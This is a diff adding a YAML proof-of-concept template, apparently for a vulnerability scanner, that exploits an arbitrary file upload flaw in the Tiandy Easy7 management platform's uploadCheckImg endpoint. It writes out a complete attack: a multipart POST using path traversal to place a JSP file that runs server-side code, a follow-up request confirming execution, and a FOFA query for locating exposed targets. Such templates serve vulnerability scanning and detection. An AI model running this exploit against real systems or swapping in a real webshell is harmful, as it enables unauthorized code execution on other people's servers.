@@ -1,0 +1,31 @@
+id: poc-yaml-tiandy-easy7-imp-uploadcheckimg-anyfile-upload
+info:
+  name: 天地伟业Easy7综合管理平台 uploadCheckImg 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: Easy7综合管理平台
+  fofa: app="Tiandy-Easy7"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /Easy7/rest/file/uploadCheckImg?fileName={{.t1}}.jsp&uploadPicturePath=/../../root/tiandy/data/
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.txt"
+
+    Content-Type: image/jpeg
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,".jsp")
+- method: GET
+  path: /imagelive/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
